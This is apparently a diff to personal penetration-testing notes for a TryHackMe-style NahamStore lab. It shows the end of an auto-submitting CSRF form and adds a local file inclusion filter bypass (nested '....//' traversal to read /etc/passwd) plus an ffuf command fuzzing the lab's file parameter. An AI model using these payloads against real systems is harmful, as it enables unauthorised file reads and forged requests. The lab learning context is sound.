@@ -164,4 +164,15 @@ Only sending the html file and automatically click the submit form to change the
 		document.forms[0].submit();
 	</script>
 <html>
+______________________________________________________________________________________________________________________________
+LFI filter bypass
+-----------------
+filter -->  ../ 
 
+Bypass with ....//....//....//....//etc/passwd
+
+In ....// if filter remove ../ another ../ is still hanging on, so we can bypass like that.
+
+LFI fuzzing with ffuf
+---------------------
+ffuf -u http://nahamstore.thm/product/picture/?file=FUZZ -w LFI-Jhaddix.txt -fs 19
